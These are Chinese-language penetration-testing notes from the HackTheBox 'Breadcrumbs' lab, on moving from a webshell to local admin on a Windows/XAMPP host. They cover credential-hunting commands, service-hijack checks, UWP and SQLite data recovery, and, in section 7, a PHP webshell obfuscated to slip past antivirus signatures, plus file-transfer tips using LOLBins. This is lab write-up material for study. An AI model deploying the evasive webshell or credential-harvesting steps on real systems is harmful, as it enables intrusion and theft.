# Windows 应用立足点 → 本机管理员 — 判读纪律与常见坑

> 沉淀自 HTB-Breadcrumbs（2026-10）。适用于：**Windows + Apache/PHP（XAMPP 类）应用**，web 目录落在普通用户 profile 下，机器上还跑着自建服务。
> 边界：本节只写"本场景特有的判读要点"。**通用提权检查清单**以 `privesc-linux-windows.md` 为准；**shell 稳定 / 传文件 / 反弹**以 `field-ops-toolbox.md` 为准；**AppLocker / 按程序拦出站 / 周期还原**以 `windows-hardened-execution.md` 为准；**应用认证伪造侧**见 `selfmade-session-and-token-forging.md`。

## 0. 作战顺序（本笔记最重要的一条）

```
webshell（低权用户）
  ① 凭据猎取 → 换身份横向          ← 优先：成本低、收益确定
  ② 本机提权（服务 / 内核 / 配置）  ← 其次
```

**反例（本项目实际踩的）**：拿到 webshell 后立刻扑向提权，找到一个"以 SYSTEM 运行 + 二进制与配置都可写"的服务，结果卡在"没有权限重启服务、也不能重启机器"上耗掉大量时间；而真正的通路躺在 web 根的一个**非字典命名目录**里。**先横向，后纵向。**

## 1. 身份与权限四查

```cmd
whoami /all
systeminfo
hostname
ipconfig
```

| 现象 | 走向 |
|---|---|
| 有 `SeImpersonatePrivilege` | Potato 系列（GodPotato / PrintSpoofer / RoguePotato） |
| 只有常规特权（Shutdown / ChangeNotify / Undock…） | 配置类或凭据类，见 §2、§3 |
| 同一个用户在"webshell 令牌"与"SSH 交互令牌"下特权/可查范围不一致 | 正常现象，见 §3.2 的权限上下文陷阱 |

## 2. 凭据猎取清单（按性价比排序）

| # | 位置 | 命令 | 典型产出 |
|---|---|---|---|
| 1 | 自动登录 | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` | `DefaultPassword` 明文（**是否残留取决于该机的配置方式**，不是必然存在） |
| 2 | 应用源码/配置 | web 根下的 `db.php` / `.env` / `web.config` | 数据库凭据、硬编码密钥 |
| 3 | **web 根的非字典目录** | 用 shell 列文件系统，**不要只靠 HTTP 爆破** | 上传/导出的数据文件、他人投递的 JSON |
| 4 | 用户 profile 常规目录 | Desktop / Downloads / Documents / OneDrive | 脚本、票据、配置 |
| 5 | UWP / Store 应用数据 | 见 §4 | 便签、密码管理器等的明文存储 |
| 6 | 凭据管理器 | `cmdkey /list` | 保存的域凭据 |
| 7 | 注册表自启项 | `Run` / `RunOnce` | 硬编码口令的脚本路径 |
| 8 | 计划任务脚本 | `schtasks /query /fo LIST /v` | 脚本内容里的口令 |
| 9 | 数据库表 | 见 §6 | 密码哈希 |

**⚠️ 别只搜自己这个用户的 profile。** 本项目第一次搜 UWP 数据时只搜了当前用户的 `Packages`，一无所获——真正的便签在**另一个用户**的 profile 里，必须先换身份才看得到。**先确定"这台机器归谁用"，再决定搜谁的 profile。**

## 3. 本地服务与伪装服务识别

> 本节的目的是**判断"值不值得打"**，不重复 `privesc-linux-windows.md` 的通用提权清单。

### 3.1 找只绑本地的高位端口

```cmd
netstat -ano | findstr LISTENING
```

**只盯 `127.0.0.1:` 开头的行**——外部 nmap 扫不到，是"只有拿到 shell 才能碰"的服务。**但必须先排除系统自带服务**（Windows 的 `CDPSvc` 占 5040、Delivery Optimization 占 7680 等）：反查服务名（§3.2）后用名字/描述判断（§3.3）。

### 3.2 反查进程与服务

```cmd
tasklist /svc /fi "pid eq <PID>"
tasklist /v  /fi "pid eq <PID>"
```

- 第一条给**服务名**
- 第二条给**会话名 + 用户**：`Session Name = Services` 且 `User Name = N/A` ⇒ 该进程不属于当前用户

**⚠️ 权限上下文陷阱（实测）**：`tasklist /v`、`net start`、`Get-CimInstance Win32_Service` 在 **SSH 交互式会话**里查 SYSTEM 进程会返回 `Access denied`，但在 **webshell（服务令牌）** 里能成功。**查不到就换一个执行通道，不要据此判定目标不存在。**

### 3.3 注册表读服务配置（不需要 SCM 权限）

```powershell
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\<服务名>" |
  Select-Object ImagePath,ObjectName,Start,DisplayName,Description | Format-List
```

| 字段 | 判据 |
|---|---|
| `ImagePath` | 二进制路径 —— **它所在目录我能不能写？**（`icacls` 确认） |
| `ObjectName` | `LocalSystem` = 以 SYSTEM 运行 |
| `Start` | `2` = AUTO_START（开机自启 → 重启后自动加载新二进制） |
| **`DisplayName` vs `Description`** | **语义对不上 = 伪装痕迹**（本项目：名字 `passman`，描述写着 Apache） |

### 3.4 服务劫持的"最后一公里"（本项目卡点）

**"二进制可写 + 以 SYSTEM 运行"并不等于能提权** —— 还差一个**触发重启**的动作，而这几条路都可能被堵。三条要查的命令：

```cmd
sc sdshow <服务名>
sc qfailure <服务名>
whoami /priv
```

- `sc sdshow` → 看 DACL 里 `IU`/`SU` 有没有 `RP`/`WP`（启停权限）
- `sc qfailure` → 看崩溃恢复动作（能否靠"弄崩它"触发重启）
- `whoami /priv` → 看 `SeShutdownPrivilege` 是否存在且 Enabled

**两个实测踩到的坑**：

1. **默认服务 DACL 不允许普通用户启停** —— `IU` 只有 `CCLCSWLOCRRC`（读），没有 `RP`/`WP`。
2. **`SeShutdownPrivilege` 显示 Enabled ≠ 能关机。** 本项目该特权在令牌里且为 Enabled，`shutdown /r /t 0` 仍返回 `Access is denied.(5)`（受登录类型/策略影响）。**判据：特权在令牌里只是必要条件，不是充分条件。**

**⇒ 行动纪律：若打算走"改配置/换二进制 + 重启"这条路，必须在动手前先跑一次 `shutdown /r /t 0` 试探**，别等写完配置才发现关不了机。

### 3.5 双实例与"从日志读真实命令行"（本项目的枢纽技巧）

一台机器可以同时跑两个同类服务实例（一个以服务身份跑 SYSTEM，一个由控制面板以普通用户拉起），**它们可以共用同一个 ServerRoot 和日志目录**。

Apache 启动时会把自己的**完整命令行**写进 error.log：

```powershell
Get-Content "<ServerRoot>\logs\error.log" -Tail 60
```

```
AH00094: Command line: '...\httpd.exe -d C:/.../apache -f C:\...\conf\original\httpd2.conf'
```

**这条信息注册表里没有** —— 服务注册的 `ImagePath` 只写了 `-k runservice`，看不到 `-f`（配置文件路径），但进程实际是带 `-f` 启动的。

> **通用判据：服务配置看注册表，运行参数看日志。** 两处不一致时，以日志（进程实际 argv）为准。

### 3.6 低权身份跑配置检查的假阴性

以低权身份跑 `httpd.exe -t -f <config>` 会报：

```
DocumentRoot must be a directory
<Directory "...">   path is invalid.
```

**这不是配置错误，是身份错误**：配置引用的路径属于高权用户的 profile，当前身份读不到，Apache 校验路径时误报。

**判据：报错的行是不是自己改过的地方？** 不是 → 先怀疑身份。
**绕法**：复制一份配置，把"读不到"的路径替换成当前身份可读的目录，再跑 `-t`，即可一路校验到文件末尾（**真配置不要动**）。

## 4. UWP / Microsoft Store 应用的数据定位

**触发信号**：文档/任务清单里出现 "Microsoft Store 应用" 字样，或要找某个 Store 应用（Sticky Notes、Photos、OneDrive…）的数据。

**平台强制布局（不是开发者自选）**：

```
%LOCALAPPDATA%\Packages\<PackageFamilyName>\LocalState\      ← 应用自己读写的数据
                                           \RoamingState\    ← 漫游数据
                                           \Settings\        ← settings.dat / registry.dat
                                           \LocalCache\ \TempState\  ← 缓存与临时
```

**查包名（不用背）**：

```powershell
dir "C:\Users\<用户>\AppData\Local\Packages" | findstr /i <关键词>
Get-AppxPackage *<关键词>* | Select-Object Name,PackageFamilyName,InstallLocation
```

**与传统 Win32 应用的对比**：后者的数据位置由开发者自选（`%APPDATA%` / `%LOCALAPPDATA%` / `ProgramData` / 注册表 / 程序目录），没有统一规律、只能翻；**而 UWP 的位置是确定的**。所以"这是 Store 应用"这句话本身**就是一条路径提示** —— 包名里的发布者哈希推不出来，但现场列目录即可。

## 5. SQLite 取证：WAL 三件套必须一起拿

**触发信号**：目标文件是 `*.sqlite` / `*.db`，且旁边有同名 `-wal` / `-shm`。

| 文件 | 内容 |
|---|---|
| `<db>` | 主库 |
| `<db>-wal` | **已提交但未检查点的事务** —— 数据常常全在这里 |
| `<db>-shm` | WAL 的共享内存索引（缺失时可重建） |

**判据：主库体积异常小（如 4096 字节 = 一页）⇒ 数据还在 WAL 里。** 只拷主库 = 拿到空库（**连表结构都可能没有**）。

**拷贝纪律**：

- **三个文件一起拷，目标文件名必须与主库严格配套** —— SQLite 靠同目录下 `<库名>-wal` 的命名约定关联，改名就找不到 WAL
- 打开时 SQLite 自动重放 WAL，无需额外操作
- 更稳妥的取法：目标机上执行 `sqlite3 <db> ".backup <out>"` 或 `VACUUM INTO`；目标机没有 sqlite3 时再直接拷三件套

```bash
scp '<user>@<host>:<...>/plum.sqlite'     /tmp/plum.sqlite
scp '<user>@<host>:<...>/plum.sqlite-wal' /tmp/plum.sqlite-wal
scp '<user>@<host>:<...>/plum.sqlite-shm' /tmp/plum.sqlite-shm
sqlite3 /tmp/plum.sqlite ".tables"
```

## 6. 数据库凭据的可用性判定

| 报错 | 含义 | 下一步 |
|---|---|---|
| `1130 Host '<ip>' is not allowed to connect` | **主机级拒绝**：账号只允许本机连 | 远程不通；拿到本机 shell 后用本机客户端连 |
| `1045 Access denied for user` | 主机允许，**凭据错** | 换凭据 |

**两种报错含义完全不同，别混为一谈。** 另外：应用配置里写 `localhost` 只说明"该应用从本机连"，**不代表这个账号不能远程连**（反之亦然）——只有实际连一次才知道。

## 7. 杀软/EDR 拦截落地的 payload：定位与绕过

> 边界：本节讲**按文件内容**拦截（写盘时扫描）。**按程序/路径拦截执行**（AppLocker、防火墙规则）与**周期还原**属另一类问题 → `windows-hardened-execution.md`。

### 7.1 现象

写入成功返回，但文件不落地；或 PHP 侧报 `move_uploaded_file(...): Failed to open stream: Invalid argument`（**报错指向源临时文件，不是目标路径**）。

### 7.2 定位：做一次受控对照（不要反复换目标路径试）

**分离两个自变量**：

| 实验 | 内容 | 目标文件名 | 观测 |
|---|---|---|---|
| A | 无害内容（如 `hello`） | `x.php` | 成功 ⇒ **路径与扩展名都没问题** |
| B | payload 内容 | `x.txt` | 失败 ⇒ **问题出在内容** |

**A 成 B 败 ⇒ 杀软按内容拦截**，与文件名、路径、扩展名无关。这一步能把排查范围一次收敛掉。

### 7.3 绕过：拆掉字符串特征

经典一句话木马 `<?php system($_GET["c"]); ?>` 命中特征库。改成：

```php
<?php $f="sys"."tem";$f(urldecode($_SERVER["QUERY_STRING"])); ?>
```

| 手法 | 作用 |
|---|---|
| `"sys"."tem"` 字符串拼接 | 文件里不再出现连续的函数名 |
| `$f(...)` 变量函数调用 | 源码里不再出现 `system(` |
| `$_SERVER["QUERY_STRING"]` 替代 `$_GET['x']` | 避开超全局特征；命令直接跟在 `?` 后，URL 无参数名 |
| `urldecode(...)` | `QUERY_STRING` 是原文不解码，需自行解码才能传含空格的命令 |
| 不用 `eval` / `assert` / `base64_decode` / `shell_exec` | 这些同样是特征词 |

**等价变体（均实测通过）**：`chr(115).chr(121)...` 构造函数名、`"\x73\x79\x73..."` 十六进制转义。

**验证纪律：改完必须用目录列表确认文件真的落地**，不能只看返回文字。

### 7.4 传文件的通用纪律

- 优先用**系统自带**（LOLBins）：`certutil`、`bitsadmin`、`curl.exe`、`powershell`
- 必须上传工具时同样先混淆字符串；或"本地生成 → 经既有上传通道投递 → `copy` 到目标位置"
- **`copy` 已有文件比新写内容更安全**：本项目最终就是"把 web 根里那个已通过检验的 PHP 文件复制到新目录"，绕开二次内容扫描
- **注意 `findstr` 空格分隔是 OR 匹配**：`findstr /i "LoadModule alias_module"` 会列出所有含任一关键词的行，**别把输出当成单一命中**（本项目据此误判过一次"追加已生效"）

## 8. 判读纪律（本项目踩过的通用坑）

| 现象 | 错误判读 | 正确判读 |
|---|---|---|
| `type <文件>` 报 `Access is denied` | "文件存在但无权读" | **不能推出存在** —— 路径不可遍历时也是这个报错。要么先 `dir` 上级目录，要么拿一个**肯定不存在**的路径做对照 |
| `dir <目录>` 报 `File Not Found` | "目录是空的" | **不能推出为空** —— 无法访问时也这么报。用 `icacls <目录>` 交叉验证（本项目：`dir` 说空、`icacls` 说 `Access is denied` ⇒ 目录存在但够不着） |
| `curl -s` 之后"没有回显" | "目标没响应" | `-s` 会吞掉 curl **自身**的错误（如本地文件不存在）。**一律用 `-sS`** |
| 请求挂死、把终端/桥接一起拖死 | — | 所有 curl 加 `--max-time N`；长任务 `nohup ... > log 2>&1 < /dev/null &` 落盘后轮询 |
| 只做 HTTP 层枚举 | "目录都扫到了" | **字典爆破扫不到"非字典命名"的目录**（本项目漏掉整个 `pizzaDeliveryUserData`）。**拿到 shell 后必须用文件系统再列一遍 web 根** |
| 在交互式 SSH 会话里查 SCM/WMI 被拒 | "服务不存在" | 换 webshell（服务令牌）通道，见 §3.2 |

## 9. 报告要点

- **区分"可读"与"可写"**：本项目的关键 finding 是**任意文件读取**（无过滤的 `file_get_contents` 路径拼接），它单独就能放大成完整的身份伪造链
- **凭据要分开陈述**：数据库凭据 ≠ 应用用户凭据 ≠ Windows 账户凭据，写清各自能用在哪里
- **"存在提权路径" ≠ "已提权"**：枚举层写"服务 XX 的二进制位于可写目录、以 LocalSystem 运行"；利用层受限时如实写"因缺少服务启停 / 关机权限未能验证"，**不要含糊成"已提权"**
